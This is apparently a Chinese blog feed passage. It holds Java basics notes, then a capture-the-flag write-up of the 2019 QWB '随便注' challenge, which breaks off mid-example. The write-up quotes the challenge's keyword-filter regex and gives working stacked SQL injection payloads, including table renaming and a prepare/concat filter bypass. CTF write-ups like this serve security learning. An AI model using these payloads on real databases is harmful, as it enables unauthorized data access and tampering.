align="left">格式化输出浮点数</td></tr><tr><td align="left">%e</td><td align="left">格式化输出科学计数法表示的浮点数</td></tr><tr><td align="left">%s</td><td align="left">格式化字符串</td></tr></tbody></table><p>注意，由于<code>%</code>表示占位符，因此，连续两个<code>%%</code>表示一个<code>%</code>字符本身。</p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>和输出相比，Java的输入就要复杂得多。</p><p>我们先看一个从控制台读取一个字符串和一个整数的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in); <span class="comment">// 创建Scanner对象</span></span><br><span class="line">        System.out.print(<span class="string">&quot;Input your name: &quot;</span>); <span class="comment">// 打印提示</span></span><br><span class="line">        String name = scanner.nextLine(); <span class="comment">// 读取一行输入并获取字符串</span></span><br><span class="line">        System.out.print(<span class="string">&quot;Input your age: &quot;</span>); <span class="comment">// 打印提示</span></span><br><span class="line">        <span class="keyword">int</span> age = scanner.nextInt(); <span class="comment">// 读取一行输入并获取整数</span></span><br><span class="line">        System.out.printf(<span class="string">&quot;Hi, %s, you are %d\n&quot;</span>, name, age); <span class="comment">// 格式化输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们通过<code>import</code>语句导入<code>java.util.Scanner</code>，<code>import</code>是导入某个类的语句，必须放到Java源代码的开头，后面我们在Java的<code>package</code>中会详细讲解如何使用<code>import</code>。</p><p>然后，创建<code>Scanner</code>对象并传入<code>System.in</code>。<code>System.out</code>代表标准输出流，而<code>System.in</code>代表标准输入流。直接使用<code>System.in</code>读取用户输入虽然是可以的，但需要更复杂的代码，而通过<code>Scanner</code>就可以简化后续的代码。</p><p>有了<code>Scanner</code>对象后，要读取用户输入的字符串，使用<code>scanner.nextLine()</code>，要读取用户输入的整数，使用<code>scanner.nextInt()</code>。<code>Scanner</code>会自动转换数据类型，因此不必手动转换。</p><p>要测试输入，我们不能在线运行它，因为输入必须从命令行读取，因此，需要走编译、执行的流程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> javac Main.java</span></span><br></pre></td></tr></table></figure><p>这个程序编译时如果有警告，可以暂时忽略它，在后面学习IO的时候再详细解释。编译成功后，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> java Main</span></span><br><span class="line">Input your name: Bob</span><br><span class="line">Input your age: 12</span><br><span class="line">Hi, Bob, you are 12</span><br></pre></td></tr></table></figure><p>根据提示分别输入一个字符串和整数后，我们得到了格式化的输出。</p><h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p><code>if</code>语句的基本语法是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 条件1满足时执行</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="comment">// 条件2满足时执行</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 条件1，2不满足时执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="判断引用类型相等"><a href="#判断引用类型相等" class="headerlink" title="判断引用类型相等"></a>判断引用类型相等</h3><p>在Java中，判断值类型的变量是否相等，可以使用<code>==</code>运算符。但是，判断引用类型的变量是否相等，<code>==</code>表示“引用是否相等”，或者说，是否指向同一个对象。例如，下面的两个String类型，它们的内容是相同的，但是，分别指向不同的对象，用<code>==</code>判断，结果为<code>false</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        String s2 = <span class="string">&quot;HELLO&quot;</span>.toLowerCase();</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">        System.out.println(s2);</span><br><span class="line">        <span class="keyword">if</span> (s1 == s2) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;s1 == s2&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;s1 != s2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">hello</span><br><span class="line">hello</span><br><span class="line">s1 != s2</span><br></pre></td></tr></table></figure><p>要判断引用类型的变量内容是否相等，必须使用<code>equals()</code>方法：</p><p>注意：执行语句<code>s1.equals(s2)</code>时，如果变量<code>s1</code>为<code>null</code>，会报<code>NullPointerException</code>：</p><h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><p><code>switch</code>语句的基本语法是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(option)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">// 执行语句</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="comment">// 执行语句</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="comment">// 执行语句</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 执行语句</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从Java 12开始，<code>switch</code>语句升级为更简洁的表达式语法，使用类似模式匹配（Pattern Matching）的方法，保证只有一种路径会被执行，并且不需要<code>break</code>语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(option)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span> -&gt; &#123;</span><br><span class="line">            <span class="comment">// 执行语句</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span> -&gt; <span class="comment">// 单个语句;</span></span><br><span class="line">        <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">            <span class="comment">// 执行语句</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用新的<code>switch</code>语法，不但不需要<code>break</code>，还可以直接返回值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> opt = <span class="keyword">switch</span>(option)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span> -&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span> -&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">        <span class="keyword">int</span> code = <span class="number">1</span>+<span class="number">1</span>;</span><br><span class="line">        yield code;<span class="comment">// switch语句返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>大多数时候，在<code>switch</code>表达式内部，我们会返回简单的值。</p><p>但是，如果需要复杂的语句，我们也可以写很多语句，放到<code>&#123;...&#125;</code>里，然后，用<code>yield</code>返回一个值作为<code>switch</code>语句的返回值：</p><h2 id="while和do-while语句"><a href="#while和do-while语句" class="headerlink" title="while和do while语句"></a>while和do while语句</h2><p><code>while</code>语句的基本语法是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (条件表达式) &#123;</span><br><span class="line">    循环语句</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 继续执行后续代码</span></span><br></pre></td></tr></table></figure><p><code>do while</code>语句的基本语法是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    执行循环语句</span><br><span class="line">&#125; <span class="keyword">while</span> (条件表达式);</span><br></pre></td></tr></table></figure><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p><code>for</code>语句的基本语法是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始条件; 循环检测条件; 循环后更新计数器) &#123;    <span class="comment">// 执行语句&#125;</span></span><br></pre></td></tr></table></figure><h3 id="for-each-循环"><a href="#for-each-循环" class="headerlink" title="for each 循环"></a>for each 循环</h3><p>Java还提供了另一种<code>for each</code>循环，它可以更简单地遍历数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;        <span class="keyword">int</span>[] ns = &#123; <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span> &#125;;        <span class="keyword">for</span> (<span class="keyword">int</span> n : ns) &#123;            System.out.println(n);        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>除了数组外，<code>for each</code>循环能够遍历所有“可迭代”的数据类型，包括后面会介绍的<code>List</code>、<code>Map</code>等。</p><h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>在循环过程中，可以使用<code>break</code>语句跳出当前循环。</p><p><code>break</code>语句通常都是配合<code>if</code>语句使用。要特别注意，<code>break</code>语句总是跳出自己所在的那一层循环。</p><p><code>break</code>会跳出当前循环，也就是整个循环都不会执行了。而<code>continue</code>则是提前结束本次循环，直接继续执行下次循环。</p><h1 id="Java数组操作"><a href="#Java数组操作" class="headerlink" title="Java数组操作"></a>Java数组操作</h1><h2 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h2><p><code>for</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ns = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; ns.length;i++)&#123;</span><br><span class="line">            System.out.println(ns[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>for each</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ns = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> n : ns)&#123;</span><br><span class="line">            System.out.println(n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><p>最简单的冒泡排序 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] num = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">var</span> input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;请输入需要排序数字的数量：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> sum = input.nextInt();</span><br><span class="line">        System.out.print(<span class="string">&quot;请输入需要排序的数字：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; sum;i++)&#123;</span><br><span class="line">            num[i] = input.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = sum - <span class="number">1</span>;i &gt; <span class="number">0</span>; i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; i;j++)&#123;</span><br><span class="line">                <span class="keyword">int</span> temp;</span><br><span class="line">                <span class="keyword">if</span>(num[j] &gt; num[j+<span class="number">1</span>])&#123;</span><br><span class="line">                    temp = num[j];</span><br><span class="line">                    num[j] = num[j+<span class="number">1</span>];</span><br><span class="line">                    num[j+<span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; sum; i++)&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;%d &quot;</span>, num[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] ns = &#123;</span><br><span class="line">                &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> &#125;,</span><br><span class="line">                &#123; <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span> &#125;,</span><br><span class="line">                &#123; <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span> &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(ns.length); </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span>[] i : ns)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j: i)&#123;</span><br><span class="line">                System.out.printf(<span class="string">&quot;%d &quot;</span>, j);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> </span><br><span class="line"><span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>Java程序的入口是<code>main</code>方法，而<code>main</code>方法可以接受一个命令行参数，它是一个<code>String[]</code>数组。</p><p>这个命令行参数由JVM接收用户输入并传给<code>main</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">            System.out.println(arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/202201061655994.png" alt="image-20210814181932877"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019强网杯 随便注</title>
      <link href="/post/2022-01/%5B2019%E5%BC%BA%E7%BD%91%E6%9D%AF%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>/post/2022-01/%5B2019%E5%BC%BA%E7%BD%91%E6%9D%AF%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="2019强网杯-随便注"><a href="#2019强网杯-随便注" class="headerlink" title="[2019强网杯]随便注"></a>[2019强网杯]随便注</h1><p><strong>考点：1、堆叠注入    2、sql预处理语句</strong></p><p>之前做过的一道题，再次遇到发现还是有很多需要学习的地方，也没有记录过堆叠注入的题，所以就想着记一下这道题的一些知识点。</p><h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>在<code>sql</code>中，分号<code>;</code>是用来表示一条<code>sql语句</code>的结束。 所以在<code>;</code>后再接一个<code>sql语句</code>将会一起执行，从而造就了堆叠注入。这里需要注意的是<code>union injection</code>联合注入和堆叠注入是有很大区别的，联合注入只是将两条语句合并在了一起进行执行，所以执行的语句类型是非常有限的，但是堆叠注入可以执行任意语句，所以堆叠注入更具有危险性。</p><h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>进入题目后，我们很容易想到是一个<code>sql注入</code>的题，所以我们就进行常规的验证。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>返回了过滤掉的命令，过滤掉了<code>select</code>很是难办，我们只能尝试堆叠注入，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases#</span></span><br></pre></td></tr></table></figure><p>成功执行并返回了正确的内容</p><p><img src="/post/2022-01/[2019%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20220106154523191.png" alt="image-20220106154523191"></p><p>看了大佬们的WP，看到了三种解法，接下来我们来一个一个看</p><h2 id="修改当前查询表"><a href="#修改当前查询表" class="headerlink" title="修改当前查询表"></a>修改当前查询表</h2><p>先看一下当前查询库中有的表<code>show tables</code>，也就是<code>1&#39;;show tables#</code></p><p><img src="/post/2022-01/[2019%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20220106154918941.png" alt="image-20220106154918941"></p><p>继续查询表中的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> `words`</span><br></pre></td></tr></table></figure><p>这里需要非常注意的是：<code>words</code>使用的是<strong>反勾号</strong>，而不是<strong>单引号</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">linux下不区分，windows下区分</span><br><span class="line">区别:</span><br><span class="line">单引号( &#x27; )或双引号主要用于字符串的引用符号</span><br><span class="line">eg：mysql&gt; SELECT &#x27;hello&#x27;, <span class="string">&quot;hello&quot;</span> ;</span><br><span class="line"></span><br><span class="line">反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]</span><br><span class="line">eg:`mysql&gt;SELECT * FROM   `table`   WHERE `id` = &#x27;abc&#x27; ;</span><br></pre></td></tr></table></figure><p>但是这里好像也可以什么都不用，直接<code>show columns from words</code>也是可以的，但是另一个表<code>1919810931114514</code>必须要加<strong>反勾号</strong></p><p>好了，经过查询我们得知如下信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">table</span>:</span><br><span class="line">words</span><br><span class="line">columns:</span><br><span class="line">&quot;id&quot;:&quot;int(10)&quot;</span><br><span class="line">&quot;data&quot;:&quot;varchar(20)&quot;</span><br><span class="line"><span class="keyword">table</span>:</span><br><span class="line"><span class="number">1919810931114514</span></span><br><span class="line">columns:</span><br><span class="line">&quot;flag&quot;:&quot;varchar(100)&quot;</span><br></pre></td></tr></table></figure><p>堆叠注入的好处就是可以同时执行好多个句子，后台的<code>sql</code>语句查询的是<code>words</code>表，我们可以将表明进行更换，再通过<code>;or 1=1#</code>就可以获得<code>flag</code>了</p><p>所以我们构造以下的<code>payload</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename table `words` to `words2`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100)#</span></span><br></pre></td></tr></table></figure><h2 id="使用预处理语句"><a href="#使用预处理语句" class="headerlink" title="使用预处理语句"></a>使用预处理语句</h2><p><code>sql</code>有一种预处理语句，使用方式为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">prepare</span> name <span class="keyword">from</span> <span class="string">&#x27;[my sql sequece]&#x27;</span>;   <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">execute</span> name;  <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">deallocate</span> <span class="operator">||</span> <span class="keyword">drop</span>) <span class="keyword">prepare</span> name;  <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure><p>而且我们还可以使用<code>set</code>进行定义变量然后达到绕过黑名单的效果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@tn</span> <span class="operator">=</span> <span class="string">&#x27;hahaha&#x27;</span>;  <span class="operator">/</span><span class="operator">/</span>存储表名</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@sql</span> <span class="operator">=</span> concat(<span class="string">&#x27;select * from &#x27;</span>, <span class="variable">@tn</span>);  <span class="operator">/</span><span class="operator">/</span>存储<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">PREPARE</span> name <span class="keyword">from</span> <span class="variable">@sql</span>;   <span class="operator">/</span><span class="operator">/</span>预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> name;  <span class="operator">/</span><span class="operator">/</span>执行预定义<span class="keyword">SQL</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> <span class="operator">||</span> <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla;  <span class="operator">/</span><span class="operator">/</span>删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure><p>这里我们既可以使用<code>char()</code>方法来拼接字符串，也可以直接利用<code>concat()</code>方法直接拼接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>（）根据ASCII表返回给定整数值的字符值</span><br><span class="line">eg:</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="type">CHAR</span>(<span class="number">77</span>,<span class="number">121</span>,<span class="number">83</span>,<span class="number">81</span>,<span class="string">&#x27;76&#x27;</span>);</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> <span class="string">&#x27;MySQL&#x27;</span></span><br><span class="line"></span><br><span class="line">contact（）函数用于将多个字符串连接成一个字符串</span><br><span class="line">contact (str1,str2,…) </span><br><span class="line">eg:</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> CONCAT(<span class="string">&#x27;My&#x27;</span>, <span 